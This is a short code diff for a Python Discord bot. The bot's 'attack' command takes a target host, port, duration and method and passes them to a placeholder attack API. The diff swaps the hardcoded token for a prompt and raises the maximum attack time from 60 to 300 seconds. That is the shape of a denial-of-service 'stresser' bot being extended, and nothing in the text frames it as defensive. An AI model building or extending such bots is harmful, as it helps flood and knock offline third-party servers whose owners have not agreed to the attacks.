@@ -6,7 +6,7 @@ import random
 from selenium import webdriver
 
 
-TOKEN = 'TOKENBOT'
+TOKEN = (input("PASTE TOKEN:"))
 intents = discord.Intents.all()
 intents.typing = False
 intents.presences = False
@@ -117,8 +117,8 @@ async def attack(ctx, host: str, port: int, attack_time: int, method: str):
     
     api_url = f'https://google.com/api/atk?key=APIKEY&host={host}&port={port}&time={attack_time}&method={method}'
     
-    if attack_time > 60:
-        await ctx.send("Max Time is 60 Seconds.")
+    if attack_time > 300:
+        await ctx.send("Max Time is 300 Seconds.")
         return
         
     response = requests.get(api_url)
